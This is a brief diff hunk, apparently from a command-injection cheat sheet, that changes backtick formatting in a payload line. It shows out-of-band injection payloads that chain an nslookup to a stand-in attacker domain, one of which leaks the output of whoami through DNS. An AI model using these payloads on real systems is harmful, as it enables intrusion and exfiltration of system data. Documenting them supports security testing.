@@ -6,7 +6,7 @@
 
 `& nslookup kgji2ohoyw.web-attacker.com &`
 
-`& nslookup ```whoami```.kgji2ohoyw.web-attacker.com &`
+`& nslookup ``whoami``.kgji2ohoyw.web-attacker.com &`
 
 Both Windows and Unix-based systems
 ```
